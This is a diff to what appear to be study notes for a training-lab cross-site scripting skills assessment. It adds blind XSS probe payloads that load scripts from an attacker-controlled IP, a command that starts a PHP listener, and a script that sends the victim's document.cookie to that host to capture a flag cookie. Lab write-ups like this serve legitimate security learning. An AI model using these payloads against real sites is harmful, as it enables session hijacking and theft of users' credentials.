@@ -131,8 +131,33 @@ Look for the position
 new Image().src='http://10.10.14.46:3333/index.php?c='+document.cookie
 ```
 
-Click on "+" to add the cookie
 
 ## Skills Assessment
 
 >**Q. What is the value of the 'flag' cookie?**
+>
+```bash
+http://10.129.13.2/assessment
+```
+
+```javascript
+"><script src=http://10.10.14.46:3333/coment></script>
+"><script src=http://10.10.14.46:3333/name></script>
+"><script src=http://10.10.14.46:3333/url></script>
+```
+
+```bash
+sudo php -S 0.0.0.0:3333
+```
+
+```bash
+nano script.js
+```
+```bash
+new Image().src='http://10.10.14.46/index.php?c='+document.cookie;
+```
+
+```javascript
+<script src=http://10.10.14.46:3333/script.js></script>
+```
+
